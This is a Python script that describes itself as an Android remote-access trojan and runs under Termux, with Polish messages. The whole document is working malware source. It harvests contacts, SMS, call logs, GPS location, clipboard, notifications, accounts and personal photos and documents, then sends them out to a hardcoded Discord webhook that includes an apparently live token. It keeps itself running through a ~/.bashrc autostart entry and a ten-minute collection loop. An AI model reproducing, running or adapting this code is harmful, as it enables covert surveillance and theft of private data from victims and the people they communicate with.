#!/usr/bin/env python3
"""
Android 16 RAT - Discord Webhook Exfiltration
"""
import os
import sys
import json
import time
import subprocess
import requests
from datetime import datetime

WEBHOOK = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send(content, file_path=None):
    """Wyślij na webhook"""
    try:
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 8*1024*1024:
            with open(file_path, 'rb') as f:
                requests.post(WEBHOOK, data={"content": str(content)[:500]}, files={"file": (os.path.basename(file_path), f)}, timeout=15)
        else:
            for i in range(0, len(str(content)), 1900):
                requests.post(WEBHOOK, data={"content": str(content)[i:i+1900]}, timeout=15)
    except:
        pass

def cmd(c):
    return subprocess.getoutput(c)

def api(c):
    return subprocess.getoutput(f"timeout 10 {c} 2>/dev/null")

# ============================================================
# 1. DEVICE INFO
# ============================================================
def device_info():
    sdk = cmd("getprop ro.build.version.sdk")
    rel = cmd("getprop ro.build.version.release")
    model = cmd("getprop ro.product.model")
    man = cmd("getprop ro.product.manufacturer")
    id_ = cmd("settings get secure android_id")
    bat = cmd("dumpsys battery | grep level | cut -d: -f2").strip()
    ip = cmd("ip -4 addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1")
    oper = cmd("getprop gsm.operator.alpha")
    
    msg = f"""**=== URZĄDZENIE {id_[:8]} ===**
Model: {model} ({man})
Android: {rel} (SDK {sdk})
Bateria: {bat}%
IP: {ip}
Operator: {oper}
ID: {id_}"""
    send(msg)

# ============================================================
# 2. CONTACTS
# ============================================================
def contacts():
    data = api("termux-contact-list")
    if not data or data == '':
        send("[-] Kontakty: brak dostępu (daj permisje w Ustawienia > Termux)")
        return
    try:
        c = json.loads(data)
        if not c:
            send("[-] Kontakty: pusta lista")
            return
        msg = f"**Kontakty ({len(c)}):**\n```\n"
        for x in c[:100]:
            name = x.get('name', '?')
            nums = ', '.join(x.get('numbers', ['?']))
            msg += f"{name}: {nums}\n"
        msg += "```"
        send(msg)
    except:
        send("[-] Kontakty: błąd parsowania JSON")

# ============================================================
# 3. SMS
# ============================================================
def sms():
    raw = cmd("content query --uri content://sms/inbox --projection address:body:date_sent 2>/dev/null | tail -30")
    if raw and raw.strip():
        send(f"**SMS Odebrane:**\n```\n{raw[:1500]}\n```")
    else:
        send("[-] SMS: brak dostępu")
    
    raw = cmd("content query --uri content://sms/sent --projection address:body:date_sent 2>/dev/null | tail -20")
    if raw and raw.strip():
        send(f"**SMS Wysłane:**\n```\n{raw[:1500]}\n```")

# ============================================================
# 4. CALL LOG
# ============================================================
def calls():
    raw = cmd("content query --uri content://call_log/calls --projection number:date:duration:type 2>/dev/null | tail -30")
    if raw and raw.strip():
        send(f"**Logi połączeń:**\n```\n{raw[:1500]}\n```")
    else:
        send("[-] Logi połączeń: brak dostępu")

# ============================================================
# 5. LOCATION
# ============================================================
def gps():
    data = api("termux-location -p provider 2>/dev/null")
    if not data or data == '{}':
        raw = cmd("dumpsys location 2>/dev/null | grep -A4 'Last Known' | head -10")
        if raw.strip():
            send(f"**Lokalizacja (dumpsys):**\n```\n{raw[:500]}\n```")
        else:
            send("[-] Lokalizacja: brak dostępu lub GPS wyłączony")
        return
    try:
        loc = json.loads(data)
        lat = loc.get('latitude', '?')
        lon = loc.get('longitude', '?')
        acc = loc.get('accuracy', '?')
        prov = loc.get('provider', '?')
        msg = f"""**Lokalizacja:**
Lat: {lat}
Lon: {lon}
Accuracy: {acc}m
Provider: {prov}
https://maps.google.com/maps?q={lat},{lon}"""
        send(msg)
    except:
        send("[-] Lokalizacja: błąd parsowania")

# ============================================================
# 6. CLIPBOARD
# ============================================================
def clipboard():
    data = api("termux-clipboard-get 2>/dev/null")
    if data and len(data) > 3:
        send(f"**Schowek:**\n```\n{data[:500]}\n```")

# ============================================================
# 7. INSTALLED APPS
# ============================================================
def apps():
    raw = cmd("pm list packages -3 2>/dev/null | cut -d: -f2 | sort")
    if raw.strip():
        send(f"**Aplikacje (3rd party):**\n```\n{raw[:1500]}\n```")

# ============================================================
# 8. ACCOUNTS
# ============================================================
def accounts():
    raw = cmd("pm list accounts 2>/dev/null")
    if raw.strip():
        send(f"**Konta:**\n```\n{raw[:500]}\n```")

# ============================================================
# 9. NOTIFICATIONS
# ============================================================
def notifications():
    data = api("termux-notification-list 2>/dev/null")
    if data and data != '[]':
        try:
            notif = json.loads(data)
            msg = f"**Notyfikacje (ostatnie {len(notif)}):**\n```\n"
            for n in notif[:30]:
                pkg = n.get('packageName', '?')
                title = n.get('title', '?')
                text = n.get('text', '?')
                msg += f"[{pkg}] {title}: {str(text)[:80]}\n"
            msg += "```"
            send(msg)
        except:
            send("[-] Notyfikacje: błąd parsowania")
    else:
        send("[-] Notyfikacje: brak dostępu (włącz Notification access w Ustawieniach)")

# ============================================================
# 10. FILES
# ============================================================
def files():
    base = "/storage/emulated/0"
    targets = [
        ("DCIM/Camera", ['.jpg','.png','.mp4']),
        ("Documents", ['.pdf','.docx','.xlsx','.txt','.env']),
        ("Download", ['.apk','.zip','.rar','.pdf']),
        ("Pictures/Screenshots", ['.png','.jpg']),
    ]
    
    found = []
    for folder, exts in targets:
        path = os.path.join(base, folder)
        if os.path.exists(path):
            for root, dirs, files_ in os.walk(path):
                for f in files_[:5]:
                    if any(f.lower().endswith(e) for e in exts):
                        fp = os.path.join(root, f)
                        if os.path.getsize(fp) < 4*1024*1024:
                            found.append(fp)
    
    if found:
        msg = f"**Pliki ({len(found)}):**\n```\n"
        for f in found[:25]:
            msg += f"{f} ({os.path.getsize(f)//1024}KB)\n"
        msg += "```"
        send(msg)
        for f in found[:2]:
            send(f"Plik: {os.path.basename(f)}", f)
    else:
        send("[-] Pliki: nic nie znaleziono")

# ============================================================
# 11. MEDIASTORE
# ============================================================
def mediastore():
    raw = cmd("content query --uri content://media/external/images/media --projection _display_name:_size:date_added 2>/dev/null | tail -15")
    if raw and raw.strip():
        send(f"**MediaStore - zdjęcia:**\n```\n{raw[:1500]}\n```")

# ============================================================
# PERSISTENCE
# ============================================================
def persist():
    script = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    line = f"python3 {script} --daemon &\n"
    try:
        with open(bashrc, 'r') as f:
            if line not in f.read():
                with open(bashrc, 'a') as f:
                    f.write(f"\n# RAT autostart\n{line}")
    except:
        pass

# ============================================================
# MAIN
# ============================================================
def main():
    daemon = '--daemon' in sys.argv
    
    # Działamy zawsze
    send("[*] RAT uruchomiony na Android 16")
    device_info()
    contacts()
    sms()
    calls()
    gps()
    clipboard()
    apps()
    accounts()
    notifications()
    mediastore()
    files()
    
    send("[+] Pierwsze zbieranie zakończone")
    persist()
    
    if daemon:
        send("[*] Tryb demona - zbieranie co 10 minut")
        while True:
            time.sleep(600)
            sms()
            calls()
            gps()
            clipboard()
            notifications()
            send(f"[*] Heartbeat OK [{datetime.now().strftime('%H:%M')}]")

if __name__ == "__main__":
    main()
